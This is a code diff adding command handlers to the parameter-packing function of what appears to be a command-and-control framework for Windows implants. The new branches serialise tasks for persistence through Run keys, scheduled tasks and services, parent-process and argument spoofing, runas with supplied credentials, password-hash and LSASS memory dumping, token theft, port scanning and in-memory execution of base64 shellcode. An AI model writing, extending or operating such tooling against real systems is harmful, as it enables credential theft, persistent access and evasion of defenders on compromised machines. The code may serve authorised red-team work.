@@ -274,6 +274,87 @@ def pack_command_params(cmd_name, params):
         pk.add_string(params.get("application", ""))
         pk.add_string(params.get("arguments", ""))
 
+    elif cmd_name == "spawn":
+        import base64
+        template_b64 = params.get("template_data", "")
+        if template_b64:
+            template_raw = base64.b64decode(template_b64)
+            pk.add_bytes(template_raw)
+        else:
+            pk.add_bytes(b"")
+
+    elif cmd_name in ("arp", "drives", "uptime", "clipboard", "windows"):
+        pass
+
+    elif cmd_name in ("net_sessions", "net_shares", "net_loggedon"):
+        pk.add_string(params.get("hostname", ""))
+
+    elif cmd_name == "reg_delete":
+        pk.add_string(params.get("hive", "HKLM"))
+        pk.add_string(params.get("key", ""))
+        pk.add_string(params.get("value_name", ""))
+
+    elif cmd_name == "reg_create_key":
+        pk.add_string(params.get("hive", "HKLM"))
+        pk.add_string(params.get("key", ""))
+
+    elif cmd_name == "persist_run":
+        pk.add_string(params.get("action", "install"))
+        pk.add_string(params.get("name", ""))
+        pk.add_string(params.get("command", ""))
+        pk.add_byte(1 if params.get("hkcu", True) else 0)
+
+    elif cmd_name == "persist_schtask":
+        pk.add_string(params.get("action", "install"))
+        pk.add_string(params.get("name", ""))
+        pk.add_string(params.get("command", ""))
+        pk.add_string(params.get("trigger", "logon"))
+
+    elif cmd_name == "persist_service":
+        pk.add_string(params.get("action", "install"))
+        pk.add_string(params.get("name", ""))
+        pk.add_string(params.get("display_name", ""))
+        pk.add_string(params.get("binary_path", ""))
+
+    elif cmd_name == "ppid_spoof":
+        pk.add_int32(int(params.get("ppid", 0)))
+
+    elif cmd_name == "argue":
+        pk.add_string(params.get("action", "set"))
+        pk.add_string(params.get("fake_args", ""))
+
+    elif cmd_name == "runas":
+        pk.add_string(params.get("domain", "."))
+        pk.add_string(params.get("username", ""))
+        pk.add_string(params.get("password", ""))
+        pk.add_string(params.get("command", ""))
+
+    elif cmd_name == "hashdump":
+        pass
+
+    elif cmd_name == "lsass_dump":
+        pk.add_string(params.get("method", "minidump"))
+        pk.add_string(params.get("dump_path", ""))
+
+    elif cmd_name == "token_store":
+        pk.add_string(params.get("action", "list"))
+        pk.add_int32(int(params.get("token_id", 0)))
+
+    elif cmd_name == "portscan":
+        pk.add_string(params.get("hosts", ""))
+        pk.add_string(params.get("ports", ""))
+        pk.add_int32(int(params.get("timeout", 1000)))
+
+    elif cmd_name == "inline_execute":
+        import base64
+        pic_b64 = params.get("pic_data", "")
+        if pic_b64:
+            pic_raw = base64.b64decode(pic_b64)
+            pk.add_bytes(pic_raw)
+        else:
+            pk.add_bytes(b"")
+        pk.add_string(params.get("arguments", ""))
+
     return pk.build()
 
 
